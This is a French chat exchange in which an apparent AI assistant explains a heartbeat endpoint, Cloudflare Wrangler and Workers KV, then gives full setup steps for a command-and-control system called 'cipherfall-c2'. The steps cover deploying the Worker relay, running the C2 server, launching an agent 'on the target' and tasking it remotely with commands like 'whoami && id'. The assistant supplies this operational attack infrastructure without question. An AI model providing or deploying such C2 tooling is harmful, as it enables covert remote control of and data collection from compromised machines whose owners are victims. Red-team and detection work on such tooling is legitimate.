❯ c'est quoi l'endpoint /hb ? c'est quoi wrangler ? c'est quoi KV ? réponds de façon succinte, pas besoin de sur développer. Enfin, explique moi simplement comment tout mettre en place

/hb (heartbeat) — l'agent l'utilise pour envoyer ses infos système (hostname, user, OS) au serveur. Ça permet au serveur de savoir qu'un agent est vivant et de mettre à jour son last_seen. Sans ça, le serveur ne connaît un agent que quand il complète une tâche.

Wrangler — le CLI officiel de Cloudflare pour déployer des Workers. npm install -g wrangler puis wrangler login.

KV (Workers KV) — le système de stockage clé-valeur de Cloudflare, accessible depuis un Worker. C'est là où sont stockés les tasks/results/heartbeats. Pense-y comme un Redis géré par Cloudflare, global et distribué.

---
Mise en place complète

1. Cloudflare — déployer le Worker

npm install -g wrangler
wrangler login

# Créer le stockage KV
wrangler kv:namespace create "C2_KV"
# → copie l'id retourné dans wrangler.toml à la place de REPLACE_WITH_YOUR_KV_NAMESPACE_ID

# Dériver le WORKER_SECRET depuis ton PSK
python3 -c "import hmac,hashlib; print(hmac.new(b'CeciEstMonPSK',b'worker_token',hashlib.sha256).hexdigest()[:32])"
# → copie la valeur affichée
wrangler secret put WORKER_SECRET
# → colle la valeur

# Déployer
wrangler deploy
# → note l'URL : https://cipherfall-c2.<ton-sous-domaine>.workers.dev

2. Serveur C2 — sur ta machine (jamais exposée)

pip install -r requirements.txt
WORKER_URL=https://cipherfall-c2.cipherfall-c2.workers.dev/ C2_PSK=CeciEstMonPSK python3 s

3. Agent — sur la cible

# Récupérer l'ID de l'agent (à noter pour l'enregistrement)
WORKER_URL=https://... C2_PSK=CeciEstMonPSK python3 agent.py --id

# Lancer l'agent
WORKER_URL=https://... C2_PSK=CeciEstMonPSK python3 agent.py

4. Opérateur — depuis ta machine

# Enregistrer l'agent avec l'ID récupéré à l'étape 3
python3 operator.py register <agent_id> "ma-cible"

# Envoyer une commande
python3 operator.py task <agent_id> "whoami && id"

# Attendre et afficher le résultat
python3 operator.py wait <task_id>
